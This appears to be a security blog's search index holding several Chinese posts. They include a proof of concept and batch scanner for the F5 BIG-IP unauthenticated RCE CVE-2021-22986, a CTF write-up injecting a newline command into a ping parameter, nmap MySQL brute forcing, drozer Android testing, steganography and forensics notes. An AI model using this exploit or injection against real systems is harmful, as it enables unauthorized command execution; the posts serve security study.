<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[F5 BIG-IP远程代码执行漏洞]]></title>
    <url>%2F2021%2F03%2F20%2FF5BIG-IP%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E(CVE-2021-22986)%2F</url>
    <content type="text"><![CDATA[漏洞简介 F5 BIG-IP是美国F5公司的一款集成了网络流量管理、应用程序安全管理、负载均衡等功能的应用交付平台。 该平台可在未登陆账号情况下执行系统命令。漏洞编号为CVE-2021-22986 影响范围 16.0.0 &lt;= BIG-IP &lt;= 16.0.1 15.1.0 &lt;= BIG-IP &lt;= 15.1.2 14.1.0 &lt;= BIG-IP &lt;= 14.1.3.1 13.1.0 &lt;= BIG-IP &lt;= 13.1.3.5 12.1.0 &lt;= BIG-IP &lt;= 12.1.5.2 7.1.0 &lt;= BIG-IQ &lt;= 7.1.0.2 7.0.0 &lt;= BIG-IQ &lt;= 7.0.0.1 6.0.0 &lt;= BIG-IQ &lt;= 6.1.0 漏洞复现 环境下载地址： https://downloads.f5.com/esd/product.jsp?sw=BIG-IP&amp;pro=big-ip_v14.x&amp;ver=14.1.2 此处下载14.1.2.8版本 用vmware打开，账号密码为root/default，之后用config命令配置网络。 该平台默认用户名为admin，密码为系统root的密码，输入密码后并修改密码即可完成部署。 POC： 1234567891011POST /mgmt/tm/util/bash HTTP/1.1Host: 192.168.95.105User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.81 Safari/537.36Accept: */*Connection: closeAuthorization: Basic YWRtaW46X-F5-Auth-Token: Content-Length: 46Content-Type: application/json&#123;&quot;command&quot;: &quot;run&quot;, &quot;utilCmdArgs&quot;: &quot;-c whoami&quot;&#125; 其中Authorization的值为系统的用户名，默认为admin的base64编码。X-F5-Auth-Token头是必加的。 批量检测： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748import requestsimport sysimport randomimport reimport jsonfrom requests.packages.urllib3.exceptions import InsecureRequestWarningdef title(): print('+------------------------------------------') print('+ 使用格式: python3 poc.py') print('+ File &gt;&gt;&gt; ip.txt') print('+------------------------------------------')def POC_1(target_url): vuln_url = target_url + "/mgmt/tm/util/bash" headers = &#123; "Authorization": "Basic YWRtaW46QVNhc1M=", "X-F5-Auth-Token": "", "Content-Type": "application/json" &#125; data = '&#123;"command":"run","utilCmdArgs":"-c id"&#125;' try: requests.packages.urllib3.disable_warnings(InsecureRequestWarning) response = requests.post(url=vuln_url, data=data, headers=headers, verify=False, timeout=2) if "commandResult" in response.text and response.status_code == 200: print("目标 &#123;&#125;存在漏洞,响应为:&#123;&#125; ".format(target_url, json.loads(response.text)["commandResult"])) else: print("目标 &#123;&#125;不存在漏洞".format(target_url)) except Exception as e: print("目标 &#123;&#125; 请求失败".format(target_url))def Scan(file_name): with open(file_name, "r", encoding='utf8') as scan_url: for url in scan_url: if url[:4] != "http": url = "https://" + url url = url.strip('\n') try: POC_1(url) except Exception as e: print("请求报错".format(e)) continueif __name__ == '__main__': title() file_name = str(input("Please input Attack File\nFile &gt;&gt;&gt; ")) Scan(file_name)]]></content>
      <categories>
        <category>web安全</category>
      </categories>
      <tags>
        <tag>Web</tag>
        <tag>命令执行</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[drozer测试组件安全]]></title>
    <url>%2F2018%2F10%2F25%2Fdrozer%E6%B5%8B%E8%AF%95%E7%BB%84%E4%BB%B6%E5%AE%89%E5%85%A8%2F</url>
    <content type="text"><![CDATA[1.win端安装drozer，Android端安装agent.apkadb install agent.apk 2.Android端运行并开启Embedded Server 3.PC端利用adb开启端口转发adb forward tcp:31415 tcp:31415 4.PC端开启droer consoledrozer console connect开启中可能存在的问题could not find java，需要检查java的环境变量，cmd分别运行java,javac,java -version检查是否能正常运行。若存在问题，需将java路径添加到环境变量。drozer目录建立名为 .drozer_config的文件，文件中添加如下内容：123[executables]java=D:\Java\jdk1.7.0_65\bin\java.exejavac=D:\Java\jdk1.7.0_65\bin\javac.exe 即java和javac的路径，保存后存放到drozer目录下，之后重新连接成功如果在win下此文件.drozer_config 无法命名，解决办法:先把文件名改为1.drozer_config，然后使用命令rename 1.drozer_config .drozer_config 即可。 #测试步骤1.获取包名12dz&gt; run app.package.list -f packagename //packagename为包名的关键字com.mwr.example.packagename 2.获取应用的基本信息1run app.package.info -a com.mwr.example.sieve 3.确定攻击面1run app.package.attacksurface com.mwr.example.sieve 4.Activity获取activity信息1run app.activity.info -a com.mwr.example.sieve 未完待续……..]]></content>
  </entry>
  <entry>
    <title><![CDATA[在线ping之命令执行]]></title>
    <url>%2F2018%2F10%2F19%2F%E5%9C%A8%E7%BA%BFping%E4%B9%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%2F</url>
    <content type="text"><![CDATA[这是一个在线ping工具，输入IP地址可查看效果我们想到命令执行，先来ping下127.0.0.1 执行ls查看下有哪些文件 ping.php?ip=127.0.0.1%0als (%0a符号，换行符) 发现flag_is_here.php，查看一下：得到flag]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>Web</tag>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[nmap列举所有脚本]]></title>
    <url>%2F2018%2F09%2F29%2Fnmap%E5%88%97%E4%B8%BE%E6%89%80%E6%9C%89%E8%84%9A%E6%9C%AC%2F</url>
    <content type="text"><![CDATA[cd /usr/share/nmap/scripts &amp;&amp; ls 举例使用：利用nmap爆破mysql密码 nmap -p 3306 –script=mysql-brute.nse -v 127.0.0.1 得出用户名为root，密码为空。]]></content>
      <categories>
        <category>系统安全</category>
      </categories>
      <tags>
        <tag>linux</tag>
        <tag>nmap</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[NTFS数据流隐写]]></title>
    <url>%2F2018%2F09%2F26%2FNTFS%E6%95%B0%E6%8D%AE%E6%B5%81%E9%9A%90%E5%86%99%2F</url>
    <content type="text"><![CDATA[文件链接：http://t.cn/R0pt7XC是一个ctf.rar，解压后是一个ctf文件夹，文件夹内有一个ctf.png做misc题首先第六感要强一点，在解压的过程里自己提出疑问：为何是rar格式？ctf里常见的是zip包（rar的加密暴力破解确实慢，但是这题又没加密） ctf.rar大小149kb，ctf.png大小119kb，解压前的文件比解压后的文件小? 其中，ctf.png表面是： 既然说到隐写，就先用binwalk来查看下 末尾有一个zip包，最常见的隐藏方式，用binwalk -e即可导出，而且zip包也没有密码，解压后是1.jpg，打开是大概这样的材质： 其实如果对这种图接触较多的话，发现很可能是visual-cryptography，相关链接：https://en.wikipedia.org/wiki/Visual_cryptography这种视觉密码，是基于两张图的异或，然后你就会疑惑这不是只有一张图吗？于是回到最初的ctf.rar，把它丢进去winhex查看 发现有2.jpg的字样，这更进一步证明了上面的猜想。稍微搜索下，会发现NTFS交换数据流（ADS）这种隐藏文件的方式。 使用lads.exe /s 可以发现ctf.jpg:2.jpg （至于lads.exe，自己去搜索，或者在某些群里的群共享文件里就有） 这里我是用notepad++.exe ctf.png:2.jpg 就可以在notepad++里显示文件，再另存为图片即可（这里notepad++我是加到了path系统变量里，解题也可以用各种软件来打开这个文件流，然后另存为图片即可） 有了1.jpg和2.jpg后，用Stegsolve打开1.jpg，然后Analyse→Image Combiner，选择 2.jpg，默认是XOR模式，即可看到flag]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>隐写</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[linux服务器多端口映射配置]]></title>
    <url>%2F2018%2F09%2F25%2Flinux%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%A4%9A%E7%AB%AF%E5%8F%A3%E6%98%A0%E5%B0%84%E9%85%8D%E7%BD%AE%2F</url>
    <content type="text"><![CDATA[环境：Ubuntu 16.04.5 LTS总共需要配置三个文件 123/etc/apache2/apache2.conf/etc/apache2/ports.conf/etc/apache2/sites-available/000-default.conf 1.apache2.conf 添加如下信息：12345NameVirtualHost *:81&lt;VirtualHost *:81&gt; ServerAdmin webmaster@domain.com DocumentRoot &quot;/var/www/html81&quot;&lt;/VirtualHost&gt; 2.ports.conf 添加监听端口1Listen 81 3.sites-available/000-default.conf 添加ServerAdmin，log等配置123456&lt;VirtualHost *:81&gt; ServerAdmin webmaster@localhost DocumentRoot /var/www/html81 ErrorLog $&#123;APACHE_LOG_DIR&#125;/error_port81.log CustomLog $&#123;APACHE_LOG_DIR&#125;/access_port81.log combined&lt;/VirtualHost&gt; 4.若是阿里云服务器，则需进入控制台，安全组添加81端口开放规则5.上述四项完成，重启apache服务，浏览器打开即可]]></content>
      <categories>
        <category>系统安全</category>
      </categories>
      <tags>
        <tag>linux</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[磁盘文件隐写恢复]]></title>
    <url>%2F2018%2F09%2F25%2F%E7%A3%81%E7%9B%98%E6%96%87%E4%BB%B6%E9%9A%90%E5%86%99%E6%81%A2%E5%A4%8D%2F</url>
    <content type="text"><![CDATA[分区里文件被误删，请找回。附件为压缩包，解压后做题题目链接：http://pan.baidu.com/s/1i5mZPEt 密码：yx81 binwalk分析可得，该文件是一个liunx系统相关文件挂载到kali ls查看用extundelete开始恢复文件恢复之前先查看下文件系统 #df -T 根据文件系统查看已删除的文件，并开始恢复 找到关键文件flag.txt！！再cat查看一下]]></content>
      <categories>
        <category>取证分析</category>
      </categories>
      <tags>
        <tag>取证</tag>
      </tags>
  </entry>
</search>
